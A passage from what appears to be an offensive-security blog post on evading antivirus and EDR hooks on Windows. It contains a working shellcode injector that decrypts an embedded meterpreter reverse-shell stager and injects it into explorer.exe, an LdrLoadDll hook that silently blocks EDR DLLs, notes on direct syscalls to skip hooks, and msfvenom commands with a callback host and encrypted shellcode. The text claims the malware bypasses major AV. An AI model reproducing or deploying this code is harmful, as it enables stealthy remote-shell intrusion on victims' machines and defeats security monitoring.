  0x6d, 0x19, 0x10, 0x2b, 0xb6, 0x89, 0x20, 0x35, 0xd4, 0x81, 0x36, 0xe2,
  0x4d, 0xf0, 0xfb, 0x1d, 0x0f, 0xfa, 0xb6, 0x9e, 0x74, 0x2d, 0x51, 0x33,
  0x79, 0xa8, 0xc1, 0xda, 0x55, 0x14, 0x87, 0x44, 0xc2, 0x19, 0x28, 0x28,
  0x8a, 0xe9, 0x24, 0x01, 0x99, 0xae, 0xa4, 0xa1, 0xdf, 0xb1, 0xcf, 0x87,
  0x54, 0x93, 0x51, 0xcc, 0xb7, 0x02, 0x4c, 0x2e, 0xeb, 0xdc, 0x7c, 0x72,
  0xbe, 0x4b, 0x2c, 0xaa, 0x34, 0x44, 0x6f, 0xbb, 0xc5, 0x79, 0x20, 0xb9,
  0x67, 0x52, 0x1e, 0x28, 0x71, 0x40, 0x72, 0xa6, 0x5b, 0x4f, 0xa0, 0xc2,
  0x1e, 0x2e, 0x6f, 0x48, 0x16, 0x1a, 0x3a, 0xfd, 0xb5, 0x9b, 0x84, 0x3c,
  0x9c, 0x4c, 0x61, 0x63, 0xe0, 0x34, 0x57, 0x24, 0xab, 0x6c, 0x3e, 0xb3,
  0x8a, 0x02, 0x74, 0x59, 0x27, 0x20, 0x0f, 0xd5, 0x8e, 0x1e, 0x5c, 0x43,
  0x61, 0xf0, 0x4d, 0x5b, 0xb3, 0x00, 0xea, 0x18, 0xb2, 0xef, 0x43, 0x94,
  0xd8, 0x5d, 0x5d, 0x4b, 0xc6, 0xd9, 0xed, 0x2f, 0xca, 0xed, 0xe1, 0x79,
  0x0c, 0xa1, 0x46, 0x77, 0x78, 0x15, 0x87, 0x9d, 0xea, 0x9e, 0xa6, 0x8b,
  0x10, 0x29, 0x49, 0x28, 0xca, 0xc1, 0x07, 0x19, 0x9b, 0x54, 0xb2, 0x1b,
  0xd2, 0x9b, 0xbc, 0x7d, 0x9c, 0x14, 0x97, 0x43, 0x7b, 0x33, 0x41, 0xd3,
  0x26, 0x7f, 0xe9, 0xf1, 0xbf, 0xfb, 0xd8, 0xc5, 0x96, 0x19, 0x5e, 0x65,
  0xa3, 0xb1, 0x18, 0x44, 0x16, 0xc1, 0x63, 0x72, 0xc8, 0x53, 0xa5, 0x74,
  0xee, 0x2c, 0x7c, 0xe2, 0x0f, 0xe4, 0x11, 0x91, 0x4d, 0xe3, 0xa4, 0xa6,
  0xd9, 0xf0, 0x59, 0x97, 0xbb, 0x86, 0x1e, 0xc4, 0x68, 0x64, 0x4b, 0x45,
  0x00, 0xf0, 0x78, 0xac, 0x98, 0x21, 0xfe, 0xd3, 0xdd, 0xe8, 0xa3, 0xca,
  0x0d, 0x77, 0xb8, 0xab, 0x7c, 0xe2, 0x64, 0x26, 0x37, 0x76, 0x85, 0x92,
  0x91, 0x2e, 0x62, 0x25, 0x6b, 0x3e, 0xd5, 0xf2, 0xf0, 0x9a, 0xda, 0xc3,
  0x60, 0x90, 0xca, 0x00, 0x04, 0x19
};
unsigned int encmeter_bin_len = 510;
/****************************************************************************************************/

// define our imports
typedef HANDLE (WINAPI * OpenProcess_) (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
typedef LPVOID (WINAPI * VirtualAllocEx_) (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef WINBOOL (WINAPI * WriteProcessMemory_) (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
typedef HANDLE (WINAPI * CreateRemoteThread_) (HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);

BOOL DecryptShellcode()
{
    BOOL bSuccess = TRUE;

    HCRYPTKEY hCryptoKey;
    HCRYPTHASH hCryptHash;
    HCRYPTPROV hCryptoProv;

    DWORD dwLen = 16;
    BYTE* pbKey = &amp;#34;HideMyShellzPlz?&amp;#34;;

    bSuccess = CryptAcquireContextW(&amp;amp;hCryptoProv, NULL, L&amp;#34;Microsoft Enhanced RSA and AES Cryptographic Provider&amp;#34;, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (!bSuccess)
    {
        goto CLEANUP;
    }

    bSuccess = CryptCreateHash(hCryptoProv, CALG_SHA_256, 0, 0, &amp;amp;hCryptHash);
    if (!bSuccess)
    {
        goto CLEANUP;
    }

    bSuccess = CryptHashData(hCryptHash, pbKey, dwLen, 0);
    if (!bSuccess)
    {
        goto CLEANUP;
    }

    bSuccess = CryptDeriveKey(hCryptoProv, CALG_RC4, hCryptHash, 0,&amp;amp;hCryptoKey);
    if (!bSuccess)
    {
        goto CLEANUP;
    }

    bSuccess = CryptDecrypt(hCryptoKey, NULL, FALSE, 0, (BYTE*)encmeter_bin, &amp;amp;encmeter_bin_len);
    if (!bSuccess)
    {
        goto CLEANUP;
    }

    goto CLEANUP;

    CLEANUP:
        CryptReleaseContext(hCryptoProv, 0);
        CryptDestroyKey(hCryptoKey);
        CryptDestroyHash(hCryptHash);

        return bSuccess;
}

DWORD FindExplorer()
{
    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnapshot)
    {
        if(Process32First(hSnapshot, &amp;amp;pe32))
        {
            do
            {
                if (strcmp(pe32.szExeFile, &amp;#34;explorer.exe&amp;#34;) == 0)
                {
                    return pe32.th32ProcessID;
                }
            } while(Process32Next(hSnapshot, &amp;amp;pe32));
            CloseHandle(hSnapshot);
        }
    }

    return -1;
}

int main(int argc,  char const *argv[])
{
    DWORD dwPid;
    LPVOID lpBuffer;
    HANDLE hProcess, hThread;

    // resolve imports
    OpenProcess_ fnOpenProcess = (OpenProcess_)GetProcAddress(GetModuleHandle(&amp;#34;kernel32.dll&amp;#34;), &amp;#34;OpenProcess&amp;#34;);
    VirtualAllocEx_ fnVirtualAllocEx = (VirtualAllocEx_)GetProcAddress(GetModuleHandle(&amp;#34;kernel32.dll&amp;#34;), &amp;#34;VirtualAllocEx&amp;#34;);
    WriteProcessMemory_ fnWriteProcessMemory = (WriteProcessMemory_)GetProcAddress(GetModuleHandle(&amp;#34;kernel32.dll&amp;#34;), &amp;#34;WriteProcessMemory&amp;#34;);
    CreateRemoteThread_ fnCreateRemoteThread = (CreateRemoteThread_)GetProcAddress(GetModuleHandle(&amp;#34;kernel32.dll&amp;#34;), &amp;#34;CreateRemoteThread&amp;#34;);

    // find the pid of explorer.exe
    dwPid = FindExplorer();
    if (dwPid == -1)
    {
        printf(&amp;#34;[!] Failed to find process\\n&amp;#34;);
        return -1;
    }

    // get a handle on the process
    hProcess = fnOpenProcess(PROCESS_ALL_ACCESS, 0, dwPid);

    // alloc memory
    lpBuffer = fnVirtualAllocEx(hProcess, NULL, (SIZE_T)encmeter_bin_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // decrypt the shellcode
    if (!DecryptShellcode())
    {
        printf(&amp;#34;[!] Failed to decrypt shellcode\\n&amp;#34;);
        return -1;
    }

    // write the shellcode to the process
    fnWriteProcessMemory(hProcess, lpBuffer, encmeter_bin, encmeter_bin_len, NULL);

    // start the shellcode
    hThread = fnCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, 0, NULL);
    if (hThread == INVALID_HANDLE_VALUE)
    {
        printf(&amp;#34;[!] Failed to inject shellcode\\n&amp;#34;);
        return -1;
    }

    printf(&amp;#34;[&amp;#43;] Successfully injected shellcode\\n&amp;#34;);

    return 0;
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;It&amp;rsquo;s an pretty basic bit of malware that will simply inject a meterpreter stager into &lt;code&gt;explorer.exe&lt;/code&gt; using well known, unsophisticated methods. Despite this it will easily bypass the detection&amp;rsquo;s used by major AV vendors. It&amp;rsquo;s not so lucky with EDR solutions though, as within seconds there is critical alerts flying all over the place. So whats different? Why does it beat AV yet fail miserably against EDR?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/Y5MwAB3le5SD.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;One of the most common methods EDR solutions will use is API hooking, as it gives it the ability to monitor the functions being called along with the arguments being passed to them. This is a problem for the above code, as by using API hooking its possible to extract the decrypted shellcode while its still in memory but before it has been written to the process, then assess weather it is malicious or if it should be allowed to be written to the remote process.&lt;/p&gt;
&lt;p&gt;I have written some PoC code to show how an EDR solution can hook an API call (&lt;code&gt;kernel32!WriteProcessMemory&lt;/code&gt; but could be &lt;code&gt;ntdll!NtWriteVirtualMemory&lt;/code&gt;) then extract the shellcode being written to a remote process.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;windows.h&amp;gt;

#define BUFFER_FILE &amp;#34;.\\\\wpm_buffer.bin&amp;#34;

// definitions
typedef WINBOOL (WINAPI * WriteProcessMemory_) (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);

char OrgWriteProcMem[50] = {};

BOOL RestoreHook(LPVOID lpAddr, CHAR* OrgBytes);
BOOL PlaceHook(LPVOID lpAddr, PVOID lpHookAddr, CHAR* lpSaveBytes);

BOOL hWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten)
{

    HANDLE hFile;
    DWORD BytesWritten;
    CHAR lpMessage[5000];

    hFile = CreateFile((LPCSTR)BUFFER_FILE, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        MessageBox(NULL, &amp;#34;CreateFile: Failed to write buffer to file&amp;#34;, NULL, 0);
        goto CALLFUNC;
    }

    if(!WriteFile(hFile, lpBuffer, nSize, &amp;amp;BytesWritten, NULL))
    {
        MessageBox(NULL, &amp;#34;WriteFile: Failed to write buffer to file&amp;#34;, NULL, 0);
        goto CALLFUNC;
    }

    sprintf(lpMessage, &amp;#34;Detected WriteProcessMemory.\\n\\nStored buffer in %s (%d bytes)&amp;#34;, BUFFER_FILE, BytesWritten);
    MessageBox(NULL, (LPCTSTR)lpMessage, &amp;#34;WriteProcessMemory&amp;#34;, 0);

    goto CALLFUNC;

    CALLFUNC:
        // close the file handle
        CloseHandle(hFile);

        // restore the function
        LPVOID lpAddr = (LPVOID)GetProcAddress(GetModuleHandle(&amp;#34;kernel32&amp;#34;), &amp;#34;WriteProcessMemory&amp;#34;);
        RestoreHook(lpAddr, OrgWriteProcMem);

        // call the function
        WriteProcessMemory_  cWriteProcessMemory = (WriteProcessMemory_)GetProcAddress(GetModuleHandle(&amp;#34;kernel32&amp;#34;), &amp;#34;WriteProcessMemory&amp;#34;);
        BOOL bRet = cWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);

        // place the hook back again
        PlaceHook(lpAddr, &amp;amp;hWriteProcessMemory, &amp;amp;OrgWriteProcMem);
        return bRet;
}

BOOL RestoreHook(LPVOID lpAddr, CHAR* OrgBytes)
{
    DWORD oldProtect, oldOldProtect;

    VirtualProtect(lpAddr, sizeof(OrgBytes), PAGE_EXECUTE_READWRITE, &amp;amp;oldProtect);
    memcpy(lpAddr, OrgBytes, sizeof(OrgBytes));
    VirtualProtect(lpAddr, sizeof(OrgBytes), oldProtect, &amp;amp;oldProtect);

    return TRUE;
}

BOOL PlaceHook(LPVOID lpAddr, PVOID lpHookAddr, CHAR* lpSaveBytes)
{
    DWORD oldProtect, oldOldProtect;

    // save the bytes
    memcpy(lpSaveBytes, lpAddr, 50);

    // our trampoline
    unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 };

    // add in the address of our hook
    *(void **)(boing &amp;#43; 2) = lpHookAddr;

    // write the hook
    VirtualProtect(lpAddr, 13, PAGE_EXECUTE_READWRITE, &amp;amp;oldProtect);
    memcpy(lpAddr, boing, sizeof(boing));
    VirtualProtect(lpAddr, 13, oldProtect, &amp;amp;oldProtect);

    return TRUE;
}

DWORD DoHooking()
{
    // hook WriteProcessMemory
    LPVOID lpAddr = (LPVOID)GetProcAddress(GetModuleHandle(&amp;#34;kernel32&amp;#34;), &amp;#34;WriteProcessMemory&amp;#34;);
    PlaceHook(lpAddr, &amp;amp;hWriteProcessMemory, &amp;amp;OrgWriteProcMem);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:
            DoHooking();
    }
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;I compiled this code as a DLL and injecting it into the above meterpreter dropper at start up (which is commonly how an EDR solution will set its API hooks). Looking at the disassembly of the &lt;code&gt;kernel32!WriteProcessMemoryStub&lt;/code&gt; function in a debugger you can see that the functions code has been completely replaced and is now forcing a &lt;code&gt;jmp&lt;/code&gt; to the &lt;code&gt;r11&lt;/code&gt; register which holds the address of the hook (&lt;code&gt;hook!hWriteProcessMemory&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/windbg_hook.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Leading to our hook capturing the contents of the buffer&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/wpm_popup.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Which when then uploaded to VirusTotal shows its clearly malicious&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/wpm_virustotal-1024x460.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;So how can we beat this? It&amp;rsquo;s possible that we could restore the functions original code, but if the EDR is performing integrity checks on its hooks then that will cause unwanted alerts when they fail. What would be best is to find a way to either prevent the DLL that places the hooks from being injected or to be able to call the hooked functions without having to get caught by the hooks.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://twitter.com/_xpn_&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;XPN&lt;/a&gt; did some good &lt;a href=&#34;https://blog.xpnsec.com/protecting-your-malware/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;research&lt;/a&gt; into how you can use Process Mitigation Policy&amp;rsquo;s to enforce the only Microsoft signed DLLS are allowed to be loaded into your process, or using Arbitrary Code Guard (ACG) to prevent the allocation or modification of executable pages of memory. Using ACG does look very promising, though sadly &lt;a href=&#34;https://blog.sevagas.com/IMG/pdf/code_injection_series_part4.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;it&amp;rsquo;s possible&lt;/a&gt; to disable ACG in a remote process with elevate privileges.&lt;/p&gt;
&lt;p&gt;When tackling this problem I wanted to find a way to prevent the DLL from being injected, while keeping the EDR thinking that the DLL had been loaded successfully (which would not be the case when using Mitigation Policy&amp;rsquo;s or ACG). To do this I figured it would be best to target the process of the DLL being mapped inside my process rather than when its getting injected into my process.&lt;/p&gt;
&lt;p&gt;A classic DLL injection method looks like this.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;VOID InjectDll(DWORD dwPid, LPCVOID lpDllPath)
{
    LPVOID lpBuffer;
    HANDLE hProcess, hThread;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwPid);
    if (!hProcess)
    {
        return;
    }

    lpBuffer = VirtualAllocEx(hProcess, NULL, strlen(lpDllPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, lpBuffer, lpDllPath, strlen(lpDllPath), NULL);
    PTHREAD_START_ROUTINE pLoadLib = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(&amp;#34;kernel32.dll&amp;#34;), &amp;#34;LoadLibraryA&amp;#34;);
    CreateRemoteThread(hProcess, NULL, 0, pLoadLib, lpBuffer, 0, NULL);

    return;
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And essentially boils down to creating a thread in the process and calling &lt;code&gt;LoadLibrary&lt;/code&gt; with the argument of the DLL you wish to inject. The &lt;code&gt;LoadLibrary&lt;/code&gt; function is then responsible for mapping the DLL into the process. Originally I was going to target &lt;code&gt;LoadLibrary&lt;/code&gt; but the problem with that is there is a few variations like &lt;code&gt;kernel32!LoadLibraryA&lt;/code&gt; or &lt;code&gt;kernel32!LoadLibraryW&lt;/code&gt; that the loader could use. So instead I decided to target &lt;code&gt;ntdll!LdrLoadDll&lt;/code&gt; which is called by all variations of &lt;code&gt;LoadLibrary&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The following code will hook &lt;code&gt;ntdll!LdrLoadDll&lt;/code&gt; and check every DLL that is attempted to be loaded against a hard coded whitelist of DLLs that should be allowed inside our process. If its on the list it will be mapped into memory like normal. If its not on this list then it will be ignored but the function will return like it has been mapped successfully.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;windows.h&amp;gt;
#include &amp;lt;winternl.h&amp;gt;

#define dwAllowDllCount 1
CHAR cAllowDlls[dwAllowDllCount][MAX_PATH] = {
                                                &amp;#34;W:\\\\allowed.dll&amp;#34;
                                             };

VOID HookLoadDll(LPVOID lpAddr);
NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress);

typedef void (WINAPI * LdrLoadDll_) (PWSTR SearchPath OPTIONAL,
                                     PULONG DllCharacteristics OPTIONAL,
                                     PUNICODE_STRING DllName,
                                     PVOID *BaseAddress);

LPVOID lpAddr;
CHAR OriginalBytes[50] = {};

NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress)
{
    INT i;
    DWORD dwOldProtect;
    BOOL bAllow = FALSE;
    DWORD dwbytesWritten;
    CHAR cDllName[MAX_PATH];

    sprintf(cDllName, &amp;#34;%S&amp;#34;, DllName-&amp;gt;Buffer);

    for (i = 0; I &amp;lt; dwAllowDllCount; i&amp;#43;&amp;#43;)
    {
        if (strcmp(cDllName, cAllowDlls[i]) == 0)
        {
            bAllow = TRUE;

            printf(&amp;#34;Allowing DLL: %s\\n&amp;#34;, cDllName);

            VirtualProtect(lpAddr, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, &amp;amp;dwOldProtect);
            memcpy(lpAddr, OriginalBytes, sizeof(OriginalBytes));
            VirtualProtect(lpAddr, sizeof(OriginalBytes), dwOldProtect, &amp;amp;dwOldProtect);

            LdrLoadDll_ LdrLoadDll = (LdrLoadDll_)GetProcAddress(LoadLibrary(&amp;#34;ntdll.dll&amp;#34;), &amp;#34;LdrLoadDll&amp;#34;);

            LdrLoadDll(SearchPath, DllCharacteristics, DllName, BaseAddress);

            HookLoadDll(lpAddr);
        }

    }

    if (!bAllow)
    {
        printf(&amp;#34;Blocked DLL: %s\\n&amp;#34;, cDllName);
    }

    return TRUE;
}

VOID HookLoadDll(LPVOID lpAddr)
{
    DWORD oldProtect, oldOldProtect;
    void *hLdrLoadDll = &amp;amp;_LdrLoadDll;

    // our trampoline
    unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 };

    // add in the address of our hook
    *(void **)(boing &amp;#43; 2) = &amp;amp;_LdrLoadDll;

    // write the hook
    VirtualProtect(lpAddr, 13, PAGE_EXECUTE_READWRITE, &amp;amp;oldProtect);
    memcpy(lpAddr, boing, sizeof(boing));
    VirtualProtect(lpAddr, 13, oldProtect, &amp;amp;oldProtect);

    return;
}

int main(int argc, char const *argv[])
{

    printf(&amp;#34;LdrLoadDll hook example - @_batsec_\\n\\n&amp;#34;);

    // get addresss of where the hook should be
    lpAddr = (LPVOID)GetProcAddress(GetModuleHandle(&amp;#34;ntdll.dll&amp;#34;), &amp;#34;LdrLoadDll&amp;#34;);

    // save the original bytes
    memcpy(OriginalBytes, lpAddr, 50);

    // set the hook
    HookLoadDll(lpAddr);

    while (TRUE)
    {
        continue;
    }

    return 0;
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And as you can see when running it, &lt;code&gt;W:\\allowed.dll&lt;/code&gt; to be mapped but &lt;code&gt;W:\\functionhooks.dll&lt;/code&gt; is blocked.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/ldrloaddll_hook.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This technique works well but the downside of it is that there is a bit of a race between how fast the hook can be placed and how fast the EDRs DLL is loaded. If the DLL is loaded before the &lt;code&gt;LdrLoadDll&lt;/code&gt; hook is placed then this technique has little effect. It is also worth pointing out that if the EDR uses a non standard method of loading a DLL - like manually mapping it - this technique probably will not work. So I recommend using a mix of all these techniques as I have done in &lt;a href=&#34;https://github.com/bats3c/shad0w/blob/master/beacon/lib/secure/main.c&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;shad0w&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So preventing the DLL from being injected is good, but what about if we are in the worst case scenario and our functions have been hooked? How can we avoid these hooks, while continuing normal execution and keeping there integrity?&lt;/p&gt;
&lt;p&gt;This is where syscalls come in. They allow you to directly call the kernel, missing out any Windows API functions. This is extremely useful as the EDRs hooks can only be placed in usermode due to &lt;a href=&#34;https://en.wikipedia.org/wiki/Kernel_Patch_Protection&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Kernel Patch Protection&lt;/a&gt; so by calling the kernel directly we can completely miss them out.&lt;/p&gt;
&lt;p&gt;Directly calling sycalls requires a bit more effort because you have to handle everything the windows API would normally do behind the scenes. You will also have to either write and link your own assembly (it will have to be version specific because &lt;a href=&#34;https://j00ru.vexillium.org/syscalls/nt/64/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;syscall numbers change&lt;/a&gt; between windows versions) or you can dynamically resolve the syscall numbers by reading it directly from &lt;code&gt;ntdll.dll&lt;/code&gt;. You can find an example of this in the implementation I &lt;a href=&#34;https://github.com/bats3c/shad0w/blob/master/beacon/src/syscalls.c&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;wrote for shad0w&lt;/a&gt; or in &lt;a href=&#34;https://github.com/am0nsec/HellsGate&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HellsGate&lt;/a&gt;. For more robust implementations, dynamically resolving syscalls is much better as without obfuscation it is very easy to &lt;a href=&#34;https://twitter.com/SBousseaden/status/1291757790311133184&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;signature&lt;/a&gt; the syscall assembly.&lt;/p&gt;
&lt;p&gt;The full source code for this injector can be found on my &lt;a href=&#34;https://github.com/bats3c/DefensiveInjector&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;github&lt;/a&gt;. Here is a snippet of the main code, it includes the &lt;code&gt;LdrLoadDll&lt;/code&gt; hook and syscalls. It is worth noting that this code will only defend against userland hooks, it will trigger a Sysmon Event ID 8 as well as other things so I will leave it as a challenge for the reader to adapt this code and make it better. &lt;a href=&#34;https://github.com/bats3c/shad0w/blob/master/beacon/src/loader.c&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;This&lt;/a&gt; could be of use to you if you decide to do that.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;windows.h&amp;gt;
#include &amp;lt;wincrypt.h&amp;gt;
#include &amp;lt;tlhelp32.h&amp;gt;
#include &amp;lt;ntdef.h&amp;gt;
#include &amp;lt;winternl.h&amp;gt;

#include &amp;#34;main.h&amp;#34;

/****************************************************************************************************/
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
// cat meter.bin | openssl enc -rc4 -nosalt -k &amp;#34;HideMyShellzPlz?&amp;#34; &amp;gt; encmeter.bin
// xxd -i encmeter.bin
unsigned char encmeter_bin[] = {
  0x6e, 0xdc, 0x5b, 0x2a, 0x59, 0xba, 0x87, 0x64, 0x3e, 0x1d, 0x15, 0xcc,
  0x55, 0x5e, 0x70, 0xdd, 0xf3, 0x57, 0x98, 0x96, 0x2a, 0xd0, 0x0f, 0xe5,
  0x5a, 0xcd, 0xab, 0x28, 0xb3, 0xda, 0xff, 0x70, 0xd5, 0x48, 0x25, 0x7f,
  0xaf, 0x87, 0x0b, 0xd4, 0xd5, 0x89, 0x44, 0xa8, 0x47, 0xc1, 0x0d, 0xce,
  0x17, 0xf3, 0x64, 0x72, 0x70, 0xd4, 0xd8, 0x5f, 0xfe, 0x66, 0xe1, 0x20,
  0x21, 0x89, 0x43, 0xf2, 0xd9, 0x95, 0x17, 0x4e, 0x96, 0xe7, 0x9a, 0xab,
  0xa8, 0x14, 0xc9, 0x85, 0x4c, 0x23, 0x5d, 0x8a, 0x24, 0xef, 0x5e, 0x3b,
  0xe7, 0x14, 0x74, 0x65, 0x6a, 0x20, 0xe2, 0x03, 0x89, 0x84, 0xfa, 0x9d,
  0xf1, 0x97, 0x46, 0xc9, 0x50, 0xc1, 0x07, 0xf6, 0x49, 0xd1, 0x2d, 0x35,
  0x45, 0x66, 0x06, 0xf7, 0x49, 0x9b, 0xc8, 0x0b, 0x0e, 0xc1, 0x3b, 0x71,
  0x7c, 0xef, 0xbe, 0x94, 0xd5, 0x81, 0xbe, 0x5f, 0x81, 0x6c, 0x7f, 0x18,
  0x1e, 0xd7, 0x3f, 0x93, 0x0f, 0x7e, 0x09, 0x2f, 0x53, 0x6c, 0x04, 0x34,
